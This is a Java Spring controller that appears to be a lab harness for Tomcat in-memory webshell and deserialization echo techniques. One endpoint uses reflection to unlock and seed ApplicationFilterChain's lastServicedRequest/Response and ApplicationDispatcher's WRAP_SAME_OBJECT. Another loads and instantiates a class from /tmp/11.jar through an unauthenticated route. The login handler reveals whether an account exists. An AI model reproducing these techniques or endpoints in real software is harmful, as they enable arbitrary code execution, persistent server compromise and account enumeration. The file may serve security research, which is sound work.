package com.test.abc;

import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;

import javax.servlet.http.HttpServletRequest;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.authenticator.NonLoginAuthenticator;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.BaseModelMBean;
import org.apache.tomcat.util.modeler.Registry;
import com.sun.jmx.interceptor.DefaultMBeanServerInterceptor;

import javax.management.MBeanServer;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


 
@Controller
public class HelloSpringController {
    String message = "Welcome to Spring MVC!";
 
    @RequestMapping("/testaa")
    public String showMessage(@RequestParam(value = "name", required = false, defaultValue = "Spring") String name) throws NoSuchFieldException, SecurityException, ClassNotFoundException, IllegalArgumentException, IllegalAccessException {
 
        
    try {	
        Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
	     
	java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
	java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
	f.setAccessible(true);
	ThreadLocal t = (ThreadLocal) f.get(null);
	javax.servlet.ServletRequest servletRequest = null;
	if (t != null && t.get() != null) {
		servletRequest = (javax.servlet.ServletRequest) t.get();
	}
	System.out.println("11111");
	
       if (servletRequest == null) {
            try {
                c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                java.lang.reflect.Method m = c.getMethod("getRequestAttributes");
                Object o = m.invoke(null);
                c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                m = c.getMethod("getRequest");
                servletRequest = (javax.servlet.ServletRequest) m.invoke(o);
            } catch (Throwable t1) {}
        }
        if (servletRequest == null) {
        	
            //return servletRequest.getServletContext();

        //spring获取法2
        try {
            c = Class.forName("org.springframework.web.context.ContextLoader");
            java.lang.reflect.Method m = c.getMethod("getCurrentWebApplicationContext");
            Object o = m.invoke(null);
            c = Class.forName("org.springframework.web.context.WebApplicationContext");
            m = c.getMethod("getServletContext");
            javax.servlet.ServletContext servletContext = (javax.servlet.ServletContext) m.invoke(o);
            //return servletContext;
        } catch (Throwable t1) {}
        
        }
       
	} catch (Exception e) {
		e.printStackTrace();
	}
	
        
        
        return "1";
    }
    @RequestMapping("/testbb")
    public String testbb(@RequestParam(value = "name", required = false, defaultValue = "Spring") String name) {
 
		try {
			/* 刚开始反序列化后执行的逻辑 */
			// 修改 WRAP_SAME_OBJECT 值为 true
			Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
			java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
			java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
			modifiersField.setAccessible(true);
			modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
			f.setAccessible(true);
			if (!f.getBoolean(null)) {
				f.setBoolean(null, true);
			}

			// 初始化 lastServicedRequest
			c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
			f = c.getDeclaredField("lastServicedRequest");
			// System.out.println(f.isAccessible());
			modifiersField = f.getClass().getDeclaredField("modifiers");
			modifiersField.setAccessible(true);
			modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
			// System.out.println(f.isAccessible());
			f.setAccessible(true);
			// System.out.println(f.isAccessible());
			if (f.get(null) == null) {
				f.set(null, new ThreadLocal());
			}

			// 初始化 lastServicedResponse
			f = c.getDeclaredField("lastServicedResponse");
			modifiersField = f.getClass().getDeclaredField("modifiers");
			modifiersField.setAccessible(true);
			modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
			f.setAccessible(true);
			if (f.get(null) == null) {
				f.set(null, new ThreadLocal());
			}
		} catch (Exception e) {
			e.printStackTrace();

		}
        return "1";
    }
    @RequestMapping("/testcc")
    public String testcc(@RequestParam(value = "name", required = false, defaultValue = "Spring") String name) throws MalformedURLException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, SecurityException, ClassNotFoundException {
 
       // ModelAndView mv = new ModelAndView("hellospring");//指定视图
       // mv.addObject("message", message);
       // mv.addObject("name", name);
		java.net.URL url1 = new java.net.URL("file:/tmp/11.jar");
		java.net.URLClassLoader myClassLoader1 = new java.net.URLClassLoader(new java.net.URL[] { url1 }, Thread.currentThread()
				.getContextClassLoader());
		myClassLoader1.loadClass("com.test.haha.ok3.AA").getConstructors()[0].newInstance();
		
        return "1";
    }
    @RequestMapping("/login")
    public String login(HttpServletRequest request,Model mv) {
    	
    	
    	
        String e = (String) request.getAttribute("shiroLoginFailure");
        if (e != null) {
            if (e.contains("org.apache.shiro.authc.UnknownAccountException")) {
                mv.addAttribute("msg", "账号不存在");
            } else if (e.contains("org.apache.shiro.authc.IncorrectCredentialsException")) {
                mv.addAttribute("msg", "密码错误");
            }
        }
        return "login";
    }
    
}